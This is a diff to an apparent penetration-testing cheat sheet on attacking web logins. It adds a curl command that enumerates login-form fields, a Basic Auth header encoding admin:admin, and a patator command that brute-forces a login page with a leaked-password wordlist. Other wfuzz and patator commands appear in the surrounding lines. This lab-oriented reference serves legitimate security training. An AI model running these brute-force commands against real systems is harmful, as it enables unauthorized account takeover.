@@ -4,6 +4,14 @@
 
 
 
+## Enumerate HTML Login Forms
+
+We can use curl to view page source code and see the input of each data cell:
+
+```bash
+curl -s http://10.10.10.101/users/login.php | grep 'input name'
+```
+
 ## HTTP Create User via POST
 
 We can create a user with curl:
@@ -26,6 +34,12 @@ See the base64 value:
 
 ```bash
 echo -n 'admin:admin' | base64
+```
+
+Authenticate with curl with valid credentials:
+
+```bash
+curl http://10.10.10.101:8080 -H "Authorization: Basic YWRtaW46YWRtaW4=" -I
 ```
 
 ### Enumerating Usernames via Error Messages
@@ -202,6 +216,7 @@ wfuzz -w cewl.out -d '<parameters>' -p 127.0.0.1:8080 http://<IP>/login/index.ph
 
 ```text
 patator http_fuzz url=http://10.10.10.108/zabbix/index.php method=POST body= 'name=zapper&password=FILE0&autologin=1&enter=Sign+in' 0=/usr/share/SecLists/Passwords/darkweb2017-top1000.txt accept\_cookie=1 follow=1 -x ignore:fgrep= 'Login name or password is incorrect.'
+patator http_fuzz url=http://10.10.10.101/users/login.php method=POST body='Username=admin&Password=FILE0&Submit=Login' 0=/opt/SecLists/Passwords/darkweb2017-top10000.txt follow=1 -x ignore:fgrep='Invalid Login Details'
 ```
 
 
